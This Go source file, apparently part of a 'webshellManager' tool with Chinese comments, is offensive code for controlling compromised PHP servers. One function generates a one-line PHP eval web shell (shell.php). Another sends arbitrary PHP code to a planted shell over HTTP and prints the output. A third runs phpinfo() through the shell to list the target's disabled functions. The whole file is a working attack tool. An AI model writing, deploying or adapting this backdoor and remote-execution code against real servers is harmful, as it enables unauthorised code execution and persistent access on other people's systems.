// Package php php.go
package php

import (
	"fmt"
	"io"
	"os"
	"regexp"
	"strings"
	"webshellManager/http"
	"webshellManager/util"
)

func ExecuteCode(payload string) (*string, error) {
	evalPayload := "cmd=" + payload + ";"
	respEval, err := http.MakeRequest(evalPayload)
	util.HandleError(err, "发送payload失败!")
	defer func(body io.ReadCloser) {
		err := body.Close()
		util.HandleError(err, "关闭响应失败!")
	}(respEval.Body)
	bodyEval, err := io.ReadAll(respEval.Body)
	util.HandleError(err, "打印php响应失败! ")
	strbody := string(bodyEval)
	if strbody != "" {
		fmt.Println("执行代码响应:")
		fmt.Printf("%s", bodyEval)
	}
	return &strbody, nil
}

func GenerateWebShell() {
	text := `<?php eval($_REQUEST['shell']);`
	filename := `shell.php`
	file, err := os.Create(filename)
	util.HandleError(err, "创建文件时出错!")
	io.WriteString(file, text)
	util.HandleError(err, "写入文件出错")
	fmt.Printf("生成文件成功!文件名:%s\n", filename)
}

func DisableFunctionInfo() {
	// 保存当前的标准输出
	oldStdout := os.Stdout

	// 创建一个黑洞，将标准输出重定向到黑洞
	null, _ := os.Create(os.DevNull)
	os.Stdout = null

	// 执行函数
	textPtr, err := ExecuteCode("phpinfo()")
	util.HandleError(err, "执行phpinfo失败")
	text := *textPtr
	// 在这里不会将输出打印到终端
	// 恢复标准输出
	os.Stdout = oldStdout
	//text := executeCode("phpinfo()")
	//fmt.Println(executeCode("phpinfo()"))
	//re, err := regexp.Compile(`disable_functions</td><td class="v">(.*?)</td>`)
	//
	//handleError(err, "正则表达式编译错误!")
	//result := re.FindAllString(text, -1)
	//fmt.Println("匹配的结果:")
	//for _, match := range result {
	//	content := match[1]
	//	cleanedContent := strings.TrimSpace(content)
	//	fmt.Println(cleanedContent)
	//}
	//编译表达式
	re := regexp.MustCompile(`disable_functions</td><td class="v">(.*?)</td>`)
	matches := re.FindAllStringSubmatch(text, -1)
	// 提取匹配项的内容并输出
	for _, match := range matches {
		// 提取匹配项中的第一个子匹配组（即，<td class="v"> 和 </td> 之间的内容）
		content := match[1]
		//去空
		cleanedContent := strings.TrimSpace(content)
		fmt.Println("过滤了如下函数:\t", cleanedContent)
	}
}
